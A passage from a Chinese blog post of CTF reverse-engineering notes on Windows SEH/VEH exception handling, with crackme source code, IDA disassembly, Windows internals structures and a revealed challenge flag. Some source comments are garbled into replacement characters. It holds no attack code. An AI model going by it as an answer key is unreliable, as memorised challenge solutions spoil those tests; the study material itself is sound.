a1-&gt;ContextRecord-&gt;Eip += <span class="number">66</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a1-&gt;ContextRecord-&gt;Eip += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是对输入的偶数字符进行了加密 check 直接逆就行了<br>这里贴一份源码 供仔细分析学习:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flagΪ miniLctf&#123;y0u_a1r4ady_und4rstand_th4_w1nd0ws_exc4pt1On_handl1e_m4chan1sm&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> NTAPI <span class="title">VectExcepHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//��֤flag��ż��λ</span></span><br><span class="line">		<span class="type">char</span>* _flag = (<span class="type">char</span>*)(pExcepInfo-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>);</span><br><span class="line">		<span class="type">char</span> _enc1[] = &#123; <span class="number">16</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">21</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">33</span>, <span class="number">46</span>, <span class="number">72</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">17</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">46</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">72</span>, <span class="number">46</span>, <span class="number">69</span>, <span class="number">33</span>, <span class="number">31</span>, <span class="number">10</span> &#125;;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(_enc1); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (_enc1[i] != (((_flag[i * <span class="number">2</span>] ^ <span class="number">55</span>) + <span class="number">4</span>) ^ <span class="number">66</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">0X42</span>;		<span class="comment">//ʧ�ܵĵط�</span></span><br><span class="line">				<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">7</span>;				<span class="comment">//���ż��λ��֤�ɹ����򴥷���һ���쳣(int 3)������SEH������ʼ��֤����λ</span></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">seh_filter</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> code, <span class="keyword">struct</span> _EXCEPTION_POINTERS* pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//��֤flag������λ</span></span><br><span class="line">		<span class="type">char</span>* _flag = (<span class="type">char</span>*)(pExcepInfo-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>);</span><br><span class="line">		<span class="type">char</span> _enc2[] = &#123;<span class="number">33</span>, <span class="number">86</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">125</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">112</span>, <span class="number">125</span>, <span class="number">109</span>, <span class="number">45</span>, <span class="number">110</span>, <span class="number">71</span>, <span class="number">33</span>, <span class="number">98</span>, <span class="number">124</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">32</span>, <span class="number">71</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">69</span>, <span class="number">124</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">68</span>&#125;;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(_enc2); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (_enc2[i] != (((_flag[i * <span class="number">2</span>+<span class="number">1</span>] ^ <span class="number">77</span>) - <span class="number">4</span>) ^ <span class="number">0X13</span> ^ (pExcepInfo-&gt;ContextRecord-&gt;Eip &amp; <span class="number">0XFF</span>)))</span><br><span class="line">			&#123;</span><br><span class="line">				pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">0X36</span>;		<span class="comment">//ʧ�ܵĵط�</span></span><br><span class="line">				<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">0X3F</span>;				<span class="comment">//��ת���ɹ�</span></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">TLS_CALLBACK</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, &amp;VectExcepHandler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckFlagFormat</span><span class="params">(<span class="type">char</span>* flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> prefix[<span class="number">10</span>] = &#123; <span class="number">109</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">76</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(flag) &gt; <span class="number">72</span> || <span class="built_in">strlen</span>(flag) &lt; <span class="number">10</span> || <span class="built_in">strncmp</span>(flag, prefix, <span class="number">9</span>) || flag[<span class="number">71</span>] != <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintSuccess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> success[<span class="number">30</span>] = &#123; <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">33</span>, <span class="number">0</span> &#125;; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, success);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintFailed</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> failed[<span class="number">30</span>] = &#123; <span class="number">84</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">32</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">33</span> ,<span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, failed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> flag[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> inputHint[<span class="number">100</span>] = &#123; <span class="number">80</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">112</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">58</span>,<span class="number">32</span>,<span class="number">0</span> &#125;; <span class="comment">//Please input your flag:</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, inputHint);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CheckFlagFormat</span>(flag))</span><br><span class="line">		<span class="keyword">goto</span> LabelFailed;</span><br><span class="line"></span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		__asm &#123;</span><br><span class="line">			lea ebx, flag;</span><br><span class="line">			<span class="keyword">xor</span> eax, eax;</span><br><span class="line">			mov dword ptr ds : [eax] , <span class="number">0</span>;</span><br><span class="line">			mov edx, <span class="number">0</span>;</span><br><span class="line">			div edx;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (<span class="built_in">seh_filter</span>(<span class="built_in">GetExceptionCode</span>(), <span class="built_in">GetExceptionInformation</span>()))</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">LabelFailed:</span><br><span class="line">	<span class="built_in">PrintFailed</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">PrintSuccess</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)				</span></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK,  <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br></pre></td></tr></table></figure>

<p>虽说不知道为什么我的vscode上这个__try __except用不了…<br>结合做了的几道题发现一般都是先处理SEH(__try __except块) 然后再处理VEH(一般在开头加AddVector…(Handler))</p>
<h2 id="hgame2022-creakme2"><a href="#hgame2022-creakme2" class="headerlink" title="hgame2022 creakme2"></a>hgame2022 creakme2</h2><p>没找到附件 大致看看汇编 对应的就是开头提到的异常是有触发条件的！<br>常规的xtea加密 得到的却是乱码<br>看看汇编</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140001112</span> loc_140001112:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>C4↓o</span><br><span class="line">.text:<span class="number">0000000140001112</span>                                         ; .rdata:<span class="number">00000001400027</span>D4↓o</span><br><span class="line">.text:<span class="number">0000000140001112</span> ;   __try &#123; <span class="comment">// __except at loc_140001150</span></span><br><span class="line">.text:<span class="number">0000000140001112</span> ;     __try &#123; <span class="comment">// __except at loc_140001141</span></span><br><span class="line">.text:<span class="number">0000000140001112</span>                 mov     eax, cs:dword_140003034</span><br><span class="line">.text:<span class="number">0000000140001118</span>                 mov     ecx, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">000000014000111</span>C                 add     ecx, eax</span><br><span class="line">.text:<span class="number">000000014000111</span>E                 mov     eax, ecx</span><br><span class="line">.text:<span class="number">0000000140001120</span>                 mov     [rsp+<span class="number">58</span>h+var_38], eax</span><br><span class="line">.text:<span class="number">0000000140001124</span>                 mov     eax, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140001128</span>                 sar     eax, <span class="number">1F</span>h</span><br><span class="line">.text:<span class="number">000000014000112B</span>                 mov     [rsp+<span class="number">58</span>h+var_28], eax</span><br><span class="line">.text:<span class="number">000000014000112F</span>                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000140001134</span>                 cdq</span><br><span class="line">.text:<span class="number">0000000140001135</span>                 mov     ecx, [rsp+<span class="number">58</span>h+var_28]</span><br><span class="line">.text:<span class="number">0000000140001139</span>                 idiv    ecx</span><br><span class="line">.text:<span class="number">000000014000113B</span>                 mov     [rsp+<span class="number">58</span>h+var_1C], eax</span><br><span class="line">.text:<span class="number">000000014000113F</span>                 jmp     <span class="type">short</span> loc_14000114E</span><br><span class="line">.text:<span class="number">000000014000113F</span> ;     &#125; <span class="comment">// starts at 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001141</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000140001141</span></span><br><span class="line">.text:<span class="number">0000000140001141</span> loc_140001141:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>C4↓o</span><br><span class="line">.text:<span class="number">0000000140001141</span> ;   __except(loc_140001DF6) <span class="comment">// owned by 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001141</span>                 mov     eax, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140001145</span>                 <span class="keyword">xor</span>     eax, <span class="number">1234567</span>h</span><br><span class="line">.text:<span class="number">000000014000114</span>A                 mov     [rsp+<span class="number">58</span>h+var_38], eax</span><br><span class="line">.text:<span class="number">000000014000114</span>E</span><br><span class="line">.text:<span class="number">000000014000114</span>E loc_14000114E:                          ; CODE XREF: sub_140001070+CF↑j</span><br><span class="line">.text:<span class="number">000000014000114</span>E                 jmp     <span class="type">short</span> loc_140001158</span><br><span class="line">.text:<span class="number">000000014000114</span>E ;   &#125; <span class="comment">// starts at 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001150</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000140001150</span></span><br><span class="line">.text:<span class="number">0000000140001150</span> loc_140001150:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>D4↓o</span><br><span class="line">.text:<span class="number">0000000140001150</span> ;   __except(loc_140001E21) <span class="comment">// owned by 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001150</span>                 mov     [rsp+<span class="number">58</span>h+var_38], <span class="number">9E3779</span>B1h</span><br></pre></td></tr></table></figure>

<p>很显然的SEH 0000000140001139段可能会触发一个除零异常<br>注意到前面的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140001128</span>                 sar     eax, <span class="number">1F</span>h</span><br></pre></td></tr></table></figure>

<p>所以当 eax&gt;&gt;31 变成0的时候 就会触发异常</p>
<p>Handler</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140001141</span> loc_140001141:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>C4↓o</span><br><span class="line">.text:<span class="number">0000000140001141</span> ;   __except(loc_140001DF6) <span class="comment">// owned by 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001141</span>                 mov     eax, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140001145</span>                 <span class="keyword">xor</span>     eax, <span class="number">1234567</span>h</span><br><span class="line">.text:<span class="number">000000014000114</span>A                 mov     [rsp+<span class="number">58</span>h+var_38], eax</span><br></pre></td></tr></table></figure>

<p>这里触发除零异常后就会对xtea的关键变量值(sum v4) 进行xor 0x1234567的操作</p>
<p>还是贴份源码 供仔细分析学习:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">FilterFuncofDBZ</span><span class="params">(<span class="type">int</span> dwExceptionCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;DIVIDE_BY_ZERO catch\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FilterFuncofOF</span><span class="params">(<span class="type">int</span> dwExceptionCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwExceptionCode == EXCEPTION_INT_OVERFLOW)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;OVERFLOW catch\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        __try &#123;</span><br><span class="line">            __try &#123;</span><br><span class="line">            sum += delta;</span><br><span class="line">            a=<span class="number">1</span> / (sum &gt;&gt; <span class="number">31</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            __except (<span class="built_in">FilterFuncofDBZ</span>(<span class="built_in">GetExceptionCode</span>()))</span><br><span class="line">            &#123;</span><br><span class="line">                sum ^= <span class="number">0x1234567</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;__except (<span class="built_in">FilterFuncofOF</span>(<span class="built_in">GetExceptionCode</span>()))</span><br><span class="line">        &#123;</span><br><span class="line">            sum = <span class="number">0x9E3779B1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%x\n&quot;, sum);</span></span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里外层甚至还套了个整数溢出异常 只是并没有触发</p>
<h1 id="进阶知识点"><a href="#进阶知识点" class="headerlink" title="进阶知识点"></a><del>进阶知识点</del></h1><h2 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h2><p>VC++编译器会对SEH做增强版本 这里简单学习以下与SEH有关的TEB(线程环境块)的知识</p>
<h3 id="NT-TIB"><a href="#NT-TIB" class="headerlink" title="_NT_TIB"></a>_NT_TIB</h3><p>TIB: 线程信息块</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>	<span class="title class_">_NT_TIB</span>&#123;</span><br><span class="line">	 <span class="keyword">struct</span>	<span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *ExceptionList;</span><br><span class="line">	 PVOID StackBase;</span><br><span class="line">	 PVOID StackLimit; </span><br><span class="line">	 PVOID SubSystemTib; </span><br><span class="line">	 <span class="keyword">union</span> &#123;</span><br><span class="line">		PVOID FiberData; </span><br><span class="line">		DWORD Version;</span><br><span class="line">	 &#125;; </span><br><span class="line">	 PVOID ArbitraryUserPointer;</span><br><span class="line"> 	 <span class="keyword">struct</span>	<span class="title class_">_NT_TIB</span> *Self;</span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure>

<p>可以看到第一个成员 ExceptionList指针 指向_EXCEPTION_REGISTRATION_RECORD结构体组成的链表 也就是SEH链</p>
<h3 id="TEB访问方法"><a href="#TEB访问方法" class="headerlink" title="TEB访问方法"></a>TEB访问方法</h3><p>Ntdll.NtCurrentTeb() 返回当前线程TEB结构体的地址</p>
<h2 id="VC-编译器级的SEH实现"><a href="#VC-编译器级的SEH实现" class="headerlink" title="VC++编译器级的SEH实现"></a>VC++编译器级的SEH实现</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION</span></span><br><span class="line">&#123;</span><br><span class="line">　　<span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION</span> *prev;      <span class="comment">//ebp-0x14</span></span><br><span class="line">　　<span class="type">void</span>                           *handler;   <span class="comment">//ebp-0x0c</span></span><br><span class="line">　　<span class="keyword">struct</span> <span class="title class_">scopetable_entry</span>        *scopetable;<span class="comment">//ebp-8</span></span><br><span class="line"><span class="comment">//类型为 scopetable_entry 的数组</span></span><br><span class="line">　　<span class="type">int</span>                            trylevel;   <span class="comment">//ebp-4</span></span><br><span class="line"><span class="comment">//数组下标，用来索引 scopetable 中的数组成员</span></span><br><span class="line">　　<span class="type">int</span>                            _ebp;       <span class="comment">//ebp</span></span><br><span class="line"><span class="comment">//包含该 _EXCEPTION_REGISTRATION 结构体的函数的栈帧指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对比原先的结构体:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *Next;</span><br><span class="line">    <span class="comment">//指向下一个 EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line"></span><br><span class="line">    PEXCEPTION_DISPOSITION Handler;  </span><br><span class="line">    <span class="comment">//指向异常处理函数</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD,*PEXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>

<h3 id="SCOPETABLE"><a href="#SCOPETABLE" class="headerlink" title="_SCOPETABLE"></a>_SCOPETABLE</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SCOPETABLE</span></span><br><span class="line">&#123;</span><br><span class="line">　　 DWORD previousTryLevel; <span class="comment">//定位前一个try块的索引值</span></span><br><span class="line">　　 DWORD lpfnFilter; <span class="comment">//当前try块的过滤函数</span></span><br><span class="line">　　 DWORD lpfnHandler; <span class="comment">//当前try块的终止函数</span></span><br><span class="line">&#125;SCOPETABLE, *PSCOPETABLE;</span><br></pre></td></tr></table></figure>

<h2 id="扩展异常处理机制"><a href="#扩展异常处理机制" class="headerlink" title="扩展异常处理机制"></a>扩展异常处理机制</h2><p>最初的设计 每个__try __except块对应一个EXCEPTION_REGISTRATION<br>但VS实际实现时 对于嵌套的__try __except块 不管里面还有多少块__try __except块 都只将一个EXCEPTION_REGISTRATION挂入当前线程的异常链表中<br>MSC提供一个处理函数 即 EXCEPTION_REGISTRATION::handler 被设置为 MSC的某个函数而不是我们自己提供的__except块 而我们自己提供的多个__except块被存储在 EXCEPTION_REGISTRATION::scopetable 数组中</p>
<h1 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h1><h2 id="SCTF2019-creakme"><a href="#SCTF2019-creakme" class="headerlink" title="SCTF2019 creakme"></a>SCTF2019 creakme</h2><p>orz 这题真的难… 不得不感慨IDA强大的FindCrypt插件(逼着我更新了IDAPRO8.3插件版…)<br>IDA打开 main巨长…<br>一看汇编 大大的 _main_SEH!</p>
<p>sub_4024A0的汇编代码:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00402320</span> ; __unwind &#123; <span class="comment">// __except_handler4</span></span><br><span class="line">.text:<span class="number">00402320</span>                 push    ebp</span><br><span class="line">.text:<span class="number">00402321</span>                 mov     ebp, esp        ; _ebp</span><br><span class="line">.text:<span class="number">00402323</span>                 push    <span class="number">0F</span>FFFFFFEh      ; trylevel</span><br><span class="line">.text:<span class="number">00402325</span>                 push    offset stru_407B58 ; scopetable</span><br><span class="line">.text:<span class="number">0040232</span>A                 push    offset __except_handler4 ; *handler</span><br><span class="line">.text:<span class="number">0040232F</span>                 mov     eax, large fs:<span class="number">0</span> ; *prev FS:[<span class="number">0</span>]指向SEH起始地址</span><br><span class="line">.text:<span class="number">00402335</span>                 push    eax</span><br></pre></td></tr></table></figure>

<p>这里入栈的刚好和前面提到的增强版SEH结构体吻合<br>关键的是 scopetable<br>点击查看</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.rdata:<span class="number">00407B</span>58 stru_407B58     dd <span class="number">0F</span>FFFFFE4h           ; GSCookieOffset</span><br><span class="line">.rdata:<span class="number">00407B</span>58                                         ; DATA XREF: sub_402320+<span class="number">5</span>↑o</span><br><span class="line">.rdata:<span class="number">00407B</span>5C                 dd <span class="number">0</span>                    ; GSCookieXOROffset ; FILTER</span><br><span class="line">.rdata:<span class="number">00407B</span>60                 dd <span class="number">0F</span>FFFFFC4h           ; EHCookieOffset</span><br><span class="line">.rdata:<span class="number">00407B</span>64                 dd <span class="number">0</span>                    ; EHCookieXOROffset</span><br><span class="line">.rdata:<span class="number">00407B</span>68                 dd <span class="number">0F</span>FFFFFFEh           ; ScopeRecord.EnclosingLevel</span><br><span class="line">.rdata:<span class="number">00407B</span>6C                 dd offset loc_4023DC    ; ScopeRecord.FilterFunc</span><br><span class="line">.rdata:<span class="number">00407B</span>70                 dd offset loc_4023EF    ; ScopeRecord.HandlerFunc</span><br></pre></td></tr></table></figure>

<p>IDA以及注释清楚了 对应查看FILTER 和 HANDLER</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">004023</span>DC loc_4023DC:                             ; DATA XREF: .rdata:stru_407B58↓o</span><br><span class="line">.text:<span class="number">004023</span>DC                 mov     eax, [ebp+ms_exc.exc_ptr] ; FILTER</span><br><span class="line">.text:<span class="number">004023</span>DF                 mov     eax, [eax]</span><br><span class="line">.text:<span class="number">004023E1</span>                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">004023E3</span>                 cmp     dword ptr [eax], <span class="number">80000003</span>h ; 断点异常</span><br><span class="line">.text:<span class="number">004023E9</span>                 setz    cl</span><br><span class="line">.text:<span class="number">004023</span>EC                 mov     eax, ecx</span><br><span class="line">.text:<span class="number">004023</span>EE                 retn</span><br></pre></td></tr></table></figure>

<p>这里通过查值发现FILTER的是一个断点异常<br>查看 HANDLER</p>
